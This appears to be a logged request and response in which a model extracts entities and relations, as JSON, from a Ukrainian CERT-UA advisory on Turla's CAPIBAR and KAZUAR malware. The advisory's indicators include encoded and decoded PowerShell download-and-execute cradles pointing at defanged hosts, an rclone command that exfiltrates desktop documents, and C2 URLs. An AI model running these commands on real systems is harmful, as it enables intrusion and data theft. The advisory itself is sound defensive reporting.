@@ -1,0 +1,368 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформаціяі</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA вживаються заходи з протидії кіберзагрозам. Так, з 2022 року за ідентифікатором UAC-0024 відслідковується активність, що полягає у здійсненні цільових кібератак, спрямованих проти сил оборони з метою шпигунства із застосуванням шкідливої програми CAPIBAR (Microsoft: "DeliveryCheck", Mandiant: "GAMEDAY").&nbsp;</p><p>Окрім застосування XSLT (Extensible Stylesheet Language Transformations) та COM-hijacking специфіка CAPIBAR полягає в наявності серверної частини, що, зазвичай, встановлюється на скомпрометованих серверах MS Exchange у вигляді MOF (Managed Object Format) файлу із застосуванням PowerShell-інструменту Desired State Configuration (DCS), фактично перетворюючи легітимний сервер в центр управління шкідливою програмою.</p><p>На етапі первинної компрометації, окрім надсилання електронних листів з додатком у вигляді документу з макросом, зловмисники можуть здійснювати модифікацію документів (наприклад, на внутрішньому загальнодоступному мережевому ресурсі), додаючи в структуру легітимного макросу декілька рядків коду, які забезпечать запуск PowerShell.</p><p>При цьому, за певних обставин на уражені ЕОМ довантажується складний багатофункціональний бекдор KAZUAR, в якому реалізовано більше 40 функцій, серед яких: "chakra" (запуск JS за допомогою ChakraCore), "eventlog" (отримання даних з журналів ОС), "forensic" (збір артефактів: compatibilityassistant, exploreruserassist, activitiescache, prefetchfiles, muicache), "steal" (викрадення автентифікаційних даних: passwords, bookmarks, autofill, history, proxies, cookies, filezilla, chromium, mozilla, outlook, openvpn, system, winscp, signal, git), "unattend" (викрадення баз даних/конфігураційних файлів програм: KeePass, Azure, Gcloud, AWS, bluemix та інших).</p><p>Серед іншого відомі випадки ексфільтрації з інфікованих ЕОМ файлів за визначеним переліком розширень з використанням легітимної програми rclone.</p><p>З урахуванням особливостей тактик, технік та процедур, а також факту використанням програми KAZUAR, з достатнім рівнем впевненості описану активність (UAC-0024) асоційовано з угрупуванням Turla (UAC-0003, KRYPTON, Secret Blizzard), діяльність яких скеровується фсб росії.</p><p>З метою створення сприятливих умов для детектування загрози, зразки шкідливих програм розповсюджено серед компаній-розробників засобів захисту.</p><p>Принагідно висловлюємо вдячність команді Microsoft Threat Intelligence (@MsftSecIntel) за безперервне сприяння в боротьбі з кіберзагозами в масштабах всієї країни.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">cdf7fa901701ea1ef642aeb271c70361&nbsp; &nbsp; 1c97f92a144ac17e35c0e40dc89e12211ef5a7d5eb8db57ab093987ae6f3b9dc&nbsp; &nbsp; localhost.mof (CAPIBAR server (MOF))
+153b713b3c6e642f39993d65ab33c5f0&nbsp; &nbsp; 5cf64f37fac74dc8f3dcb58831c3f2ce2b3cf522db448b40acdab254dd46cb3e&nbsp; &nbsp; Pending.mof (CAPIBAR server (MOF))
+9ececb4acbf692c2a8ea411f2e7dd006&nbsp; &nbsp; 07f9b090172535089eb62a175e5deaf95853fdfd4bcabf099619c60057d38c57&nbsp; &nbsp; Server.dll (CAPIBAR server)
+5c7466a177fcaad2ebab131a54c28fab&nbsp; &nbsp; bd7dbaf91ba162b6623292ebcdd2768c5d87e518240fe8ca200a81e9c7f01d76&nbsp; &nbsp; Control.dll (CAPIBAR)
+b63c2ec9a631e0217d39c4a43527a0ce&nbsp; &nbsp; 1c1bb64e38c3fbe1a8f0dcb94ded96b332296bcbf839de438a4838fb43b20af3&nbsp; &nbsp; logon.aspx
+420b7dc391f2cb0a9a684c1c48c334e2&nbsp; &nbsp; 01c5778be73c10c167fae6d7970c0be23a29af1873d743419b1803c035d92ef7&nbsp; &nbsp; logon[1].aspx
+491e462bf1213fede82925dea5df8fff&nbsp; &nbsp; ba2c8df04bcba5c3cfd343a59d8b59b76779e6c27eb27b7ac73ded97e08f0f39&nbsp; &nbsp; logon[1].aspx
+9dd2bea4f2df8d3ef51dc10c6db2e07a&nbsp; &nbsp; aaf7642f0cab75240ec65bc052a0a602366740b31754156b3a0c44dccec9bebe&nbsp; &nbsp; SYNC[1]
+8c56c22343853d3797037bdac2cec6c7&nbsp; &nbsp; d4d7c12bdb66d40ad58c211dc6dd53a7494e03f9883336fa5464f0947530709f&nbsp; &nbsp; wp-file-script.js
+17402fc21c7bafae2c1a149035cd0835&nbsp; &nbsp; 19b7ddd3b06794abe593bf533d88319711ca15bb0a08901b4ab7e52aab015452&nbsp; &nbsp; Control.dll (CAPIBAR)
+d3065b4b1e8f6ecb63685219113ff0b8&nbsp; &nbsp; 4ef8db0ca305aaab9e2471b198168021c531862cb4319098302026b1cfa89947&nbsp; &nbsp; Control.dll (CAPIBAR)
+5210b3d85fd0026205baee2c77ac0acd&nbsp; &nbsp; 64e8744b39e15b76311733014327311acd77330f8a135132f020eac78199ac8a&nbsp; &nbsp; two.exe (CAPIBAR)
+4065e647380358d22926c24a63c26ac4&nbsp; &nbsp; 5e122ff3066b6ef2a89295df925431c151f1713708c99772687a30c3204064bd&nbsp; &nbsp; Config.dat
+11a289347b95aab157aa0efe4a59bf24&nbsp; &nbsp; 91dc8593ee573f3a07e9356e65e06aed58d8e74258313e3414a7de278b3b5233&nbsp; &nbsp; Senatorial.exe (KAZUAR)
+cba1f4c861240223332922d2913d18e5&nbsp; &nbsp; b8ee794b04b69a1ee8687daabfe4f912368a500610a099e3072b03eeb66077f8&nbsp; &nbsp; 1.ps1
+65102299bf8d7f0129ebbcb08a9c2d98&nbsp; &nbsp; 8168dc0baea6a74120fbabea261e83377697cb5f9726a2514f38ed04b46c56c8&nbsp; &nbsp; message (Steel Signal's "config.json", "db.sqlite")
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">C:\Windows\System32\config\systemprofile\AppData\Roaming\ASKOD\localhost.mof
+C:\Windows\System32\config\systemprofile\AppData\Roaming\ZOV\localhost.mof
+C:\Windows\System32\Configuration\Pending.mof
+C:\ProgramData\ASUS\ASUS System Control Interface\AsusSoftwareManager\Config.dat
+%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\8HIA0N4E\logon[1].aspx
+%LOCALAPPDATA%\assembly\dl3\QKP9W8EK.5CJ\XRNLX3QV.5BO\3d7183c9\00000000_00000000\__AssemblyInfo__.ini
+%LOCALAPPDATA%\assembly\dl3\QKP9W8EK.5CJ\XRNLX3QV.5BO\3d7183c9\00000000_00000000\logon.aspx
+%LOCALAPPDATA%\Microsoft\OneDrive\Update\UpdateService.exe
+%LOCALAPPDATA%\Microsoft\OneDrive\Update\rclone.conf
+%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\UOIQCADZ\SYNC[1]
+powershell -e JAB3AD0AbgBlAFcALQBPAGIAagBFAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AEUAYgBjAEwAaQBlAE4AdAA7ACQAZgBpAGwAZQA9ACQAdwAuAEQAbwB3AG4ATABvAGEAZABTAHQAUgBpAE4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AYQBkAGUAbABhAGkAZABhAC4AdQBhAC8AcABsAHUAZwBpAG4AcwAvAHYAbQBzAGUAYQByAGMAaAAvAHcAcAAtAGMAbwBuAGYAaQBnAC0AdABoAGUAbQBlAHMALgBwAGgAcAAnACkAOwBpAEUAeAAgACQAZgBpAGwAZQA=
+powershell -e JABHAHIAcQBkAHEAdwBkAGUAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAGUATgB0ADsAJABpAHUAYQBXAD0AJABHAHIAcQBkAHEAdwBkAGUALgBEAE8AdwBOAEwATwBhAEQAUwB0AFIAaQBOAGcAKAAnAGgAVAB0AFAAcwA6AC8ALwBhAGwAZQBpAG0AcABvAHIAdABhAGQAbwByAGEALgBuAGUAdAAvAGkAbQBhAGcAZQBzAC8AcwBsAGkAZABlAHMAXwBsAG8AZwBvAC8AJwApADsAYABpAG4AdgBPAGAASwBlAGAALQBgAEUAeABgAFAAcgBlAHMAcwBgAEkAbwBgAE4AIAAkAGkAdQBhAFcA
+$w=neW-ObjEct system.net.wEbcLieNt;$file=$w.DownLoadStRiNg('hxxps://www.adelaida[.]ua/plugins/vmsearch/wp-config-themes.php');iEx $file
+$Grqdqwde=New-ObjEcT SYsTeM.NEt.WebCLieNt;$iuaW=$Grqdqwde.DOwNLOaDStRiNg('hxxPs://aleimportadora[.]net/images/slides_logo/');invOKe-ExPressIoN $iuaW
+"C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\UpdateService.exe" "copy" "C:\Users\%USERNAME%\Desktop" "remote:%COMPUTERNAME%\Desktop" "--include" "*.{{jpe?g|txt|docx?|rtf|pdf|xlsx?|xlsm|pptx?|zip|rar|7z}}" "-M" "--max-size" "50M" "--max-age" "200d" "--bwlimit" "1M:1M" "--order-by" "modtime,desc" "--log-file=C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\log_1.dat" "-vv"
+\Mozilla\Updates Firefox Browser (Scheduled Task)
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Gentling
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Gentling\Maleness
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Gentling\Maleness1
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Gentling\Maleness2
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\GameBarApi\GameBarId
+HKEY_CURRENT_USER\Software\Classes\CLSID\{84F0FAE1-C27B-4F6F-807B-28CF6F96287D}\InprocServer32\1.0.0.0\CodeBase
+HKEY_CURRENT_USER\Software\Classes\CLSID\{8989946A-2F3B-4BE9-874E-D0B2B534ACA0}\ScriptletURL
+HKEY_CURRENT_USER\Software\Classes\CLSID\{84f0fae1-c27b-4f6f-807b-28cf6f96287d}\ScriptletURL
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXps://www.adelaida[.]ua/plugins/vmsearch/wp-config-plugins.php
+hXXps://www.adelaida[.]ua/plugins/vmsearch/wp-config-themes.php
+hXXps://www.adelaida[.]ua/plugins/vmsearch/wp-file-script.js
+hXXps://atomydoc[.]kg/src/open_center/
+hXXps://atomydoc[.]kg/src/open_center/?page=ccl
+hXXps://atomydoc[.]kg/src/open_center/?page=fst
+hXXps://atomydoc[.]kg/src/open_center/?page=snd
+hXXps://atomydoc[.]kg/src/open_center/?page=trd
+hXXps://aleimportadora[.]net/images/slides_logo/
+hXXps://aleimportadora[.]net/images/slides_logo/?page=
+hXXps://aleimportadora[.]net/images/slides_logo/fg/message
+hXXps://aleimportadora[.]net/images/slides_logo/fg/music
+hXXps://aleimportadora[.]net/images/slides_logo/fg/video
+hXXps://aleimportadora[.]net/images/slides_logo/index.php
+hXXps://octoberoctopus.co[.]za/wp-includes/sitemaps/web/
+hXXps://sansaispa[.]com/wp-includes/images/gallery/
+hXXps://www.pierreagencement[.]fr/wp-content/languages/index.php
+hXXps://mail.aet.in[.]ua/outlook/api/logon.aspx
+hXXps://mail.kzp[.]bg/outlook/api/logon.aspx
+hXXps://mail.numina[.]md/owa/scripts/logon.aspx (CAPIBAR C2URL)
+hXXps://mail.aet.in[.]ua/outlook/api/logoff.aspx (CAPIBAR C2URL)
+hXXps://mail.arlingtonhousing[.]us/outlook/api/logoff.aspx (CAPIBAR C2URL)
+hXXps://mail.kzp[.]bg/outlook/api/logoff.aspx (CAPIBAR C2URL)
+hXXps://mail.lechateaudelatour[.]fr/MICROSOFT.EXCHANGE.MAILBOXREPLICATIONSERVICE.PROXYSERVICE/RPCWITHCERT/SYNC (CAPIBAR C2URL)
+hXXps://mail.lebsack[.]de/MICROSOFT.EXCHANGE.MAILBOXREPLICATIONSERVICE.PROXYSERVICE/RPCWITHCERT/SYNC (CAPIBAR C2URL)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження шкідливою програмою CAPIBAR</p><p><br></p><p></p><p>Рис.2 Приклад серверної частини CAPIBAR</p><p><br></p><p></p><p>Рис.3 Приклад ланцюга запуску шкідливої програми KAZUAR</p>
+
+=== RESPONSE (8.3s, in 5508 / out 2740 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "UAC-0024",
+      "kind": "threat actor",
+      "gloss": "A cyber threat cluster associated with Turla targeting defense forces for espionage."
+    },
+    {
+      "name": "CAPIBAR",
+      "kind": "malware family",
+      "gloss": "A malware family also known as DeliveryCheck or GAMEDAY used for espionage."
+    },
+    {
+      "name": "DeliveryCheck",
+      "kind": "malware family",
+      "gloss": "A Microsoft tracking name for the CAPIBAR malware family."
+    },
+    {
+      "name": "GAMEDAY",
+      "kind": "malware family",
+      "gloss": "A Mandiant tracking name for the CAPIBAR malware family."
+    },
+    {
+      "name": "Microsoft",
+      "kind": "company",
+      "gloss": "An American multinational technology corporation producing software, services, and hardware."
+    },
+    {
+      "name": "Mandiant",
+      "kind": "company",
+      "gloss": "An American cybersecurity company and subsidiary of Google."
+    },
+    {
+      "name": "MS Exchange",
+      "kind": "software product",
+      "gloss": "A mail and calendaring server developed by Microsoft."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "KAZUAR",
+      "kind": "malware family",
+      "gloss": "A sophisticated multifunctional backdoor malware used by Russian cyber espionage actors."
+    },
+    {
+      "name": "rclone",
+      "kind": "software product",
+      "gloss": "An open-source command-line program to manage and synchronize files on cloud storage."
+    },
+    {
+      "name": "Turla",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage group also known as UAC-0003, KRYPTON, and Secret Blizzard."
+    },
+    {
+      "name": "UAC-0003",
+      "kind": "threat actor",
+      "gloss": "A CERT-UA identifier for the Russian threat group Turla."
+    },
+    {
+      "name": "KRYPTON",
+      "kind": "threat actor",
+      "gloss": "A threat actor tracking name synonymous with the Turla group."
+    },
+    {
+      "name": "Secret Blizzard",
+      "kind": "threat actor",
+      "gloss": "A Microsoft tracking name for the Russian cyber espionage group Turla."
+    },
+    {
+      "name": "фсб росії",
+      "kind": "government body",
+      "gloss": "The Federal Security Service of the Russian Federation."
+    },
+    {
+      "name": "росії",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe and Northern Asia."
+    },
+    {
+      "name": "Microsoft Threat Intelligence",
+      "kind": "company division",
+      "gloss": "The security research and threat intelligence group within Microsoft."
+    },
+    {
+      "name": "www.adelaida[.]ua",
+      "kind": "internet domain",
+      "gloss": "A compromised or malicious domain used to host payloads."
+    },
+    {
+      "name": "atomydoc[.]kg",
+      "kind": "internet domain",
+      "gloss": "An internet domain used in cyber espionage activity."
+    },
+    {
+      "name": "aleimportadora[.]net",
+      "kind": "internet domain",
+      "gloss": "A domain used to host malicious scripts and payloads."
+    },
+    {
+      "name": "octoberoctopus.co[.]za",
+      "kind": "internet domain",
+      "gloss": "A domain used for malicious infrastructure."
+    },
+    {
+      "name": "sansaispa[.]com",
+      "kind": "internet domain",
+      "gloss": "A domain used in the malicious campaign."
+    },
+    {
+      "name": "www.pierreagencement[.]fr",
+      "kind": "internet domain",
+      "gloss": "A compromised website used in malicious infrastructure."
+    },
+    {
+      "name": "mail.aet.in[.]ua",
+      "kind": "internet domain",
+      "gloss": "A compromised mail server domain used as CAPIBAR command-and-control infrastructure."
+    },
+    {
+      "name": "mail.kzp[.]bg",
+      "kind": "internet domain",
+      "gloss": "A mail server domain used as command-and-control infrastructure."
+    },
+    {
+      "name": "mail.numina[.]md",
+      "kind": "internet domain",
+      "gloss": "A compromised mail server domain used as CAPIBAR command-and-control."
+    },
+    {
+      "name": "mail.arlingtonhousing[.]us",
+      "kind": "internet domain",
+      "gloss": "A mail server domain leveraged as CAPIBAR command-and-control infrastructure."
+    },
+    {
+      "name": "mail.lechateaudelatour[.]fr",
+      "kind": "internet domain",
+      "gloss": "A compromised mail server domain used as a CAPIBAR command-and-control server."
+    },
+    {
+      "name": "mail.lebsack[.]de",
+      "kind": "internet domain",
+      "gloss": "A compromised mail server domain leveraged as CAPIBAR command-and-control."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0024",
+      "type": "uses-malware",
+      "tail": "CAPIBAR",
+      "evidence": "активність, що полягає у здійсненні цільових кібератак... із застосуванням шкідливої програми CAPIBAR"
+    },
+    {
+      "head": "UAC-0024",
+      "type": "associated-with-actor",
+      "tail": "Turla",
+      "evidence": "описану активність (UAC-0024) асоційовано з угрупуванням Turla"
+    },
+    {
+      "head": "фсб росії",
+      "type": "directs-threat-actor",
+      "tail": "Turla",
+      "evidence": "угрупуванням Turla (UAC-0003, KRYPTON, Secret Blizzard), діяльність яких скеровується фсб росії"
+    },
+    {
+      "head": "фсб росії",
+      "type": "subordinated-to-country",
+      "tail": "росії",
+      "evidence": "фсб росії"
+    },
+    {
+      "head": "Turla",
+      "type": "uses-malware",
+      "tail": "KAZUAR",
+      "evidence": "а також факту використанням програми KAZUAR, з достатнім рівнем впевненості описану активність (UAC-0024) асоційовано з угрупуванням Turla"
+    },
+    {
+      "head": "UAC-0024",
+      "type": "uses-tool",
+      "tail": "rclone",
+      "evidence": "випадки ексфільтрації з інфікованих ЕОМ файлів... з використанням легітимної програми rclone"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "targets-software",
+      "tail": "MS Exchange",
+      "evidence": "серверної частини, що, зазвичай, встановлюється на скомпрометованих серверах MS Exchange"
+    },
+    {
+      "head": "Microsoft Threat Intelligence",
+      "type": "division-of",
+      "tail": "Microsoft",
+      "evidence": "команді Microsoft Threat Intelligence (@MsftSecIntel)"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "uses-c2-domain",
+      "tail": "mail.numina[.]md",
+      "evidence": "hXXps://mail.numina[.]md/owa/scripts/logon.aspx (CAPIBAR C2URL)"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "uses-c2-domain",
+      "tail": "mail.aet.in[.]ua",
+      "evidence": "hXXps://mail.aet.in[.]ua/outlook/api/logoff.aspx (CAPIBAR C2URL)"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "uses-c2-domain",
+      "tail": "mail.arlingtonhousing[.]us",
+      "evidence": "hXXps://mail.arlingtonhousing[.]us/outlook/api/logoff.aspx (CAPIBAR C2URL)"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "uses-c2-domain",
+      "tail": "mail.kzp[.]bg",
+      "evidence": "hXXps://mail.kzp[.]bg/outlook/api/logoff.aspx (CAPIBAR C2URL)"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "uses-c2-domain",
+      "tail": "mail.lechateaudelatour[.]fr",
+      "evidence": "hXXps://mail.lechateaudelatour[.]fr/MICROSOFT.EXCHANGE.MAILBOXREPLICATIONSERVICE.PROXYSERVICE/RPCWITHCERT/SYNC (CAPIBAR C2URL)"
+    },
+    {
+      "head": "CAPIBAR",
+      "type": "uses-c2-domain",
+      "tail": "mail.lebsack[.]de",
+      "evidence": "hXXps://mail.lebsack[.]de/MICROSOFT.EXCHANGE.MAILBOXREPLICATIONSERVICE.PROXYSERVICE/RPCWITHCERT/SYNC (CAPIBAR C2URL)"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "uses-malware",
+      "definition": "A threat actor utilizes a specific malware family during their cyber operations."
+    },
+    {
+      "name": "associated-with-actor",
+      "definition": "An activity cluster or campaign is attributed or linked to a known threat group."
+    },
+    {
+      "name": "directs-threat-actor",
+      "definition": "A government body or sponsor commands or coordinates a threat actor's activities."
+    },
+    {
+      "name": "subordinated-to-country",
+      "definition": "A government body or military unit belongs to or operates under the jurisdiction of a specific country."
+    },
+    {
+      "name": "uses-tool",
+      "definition": "A threat actor employs a legitimate software tool or utility to achieve technical objectives."
+    },
+    {
+      "name": "targets-software",
+      "definition": "A malware family or threat actor installs on, compromises, or leverages a specific software product."
+    },
+    {
+      "name": "division-of",
+      "definition": "An organization unit or team is part of a parent company or institution."
+    },
+    {
+      "name": "uses-c2-domain",
+      "definition": "A malware family contacts or communicates with a specific command-and-control domain."
+    }
+  ]
+}
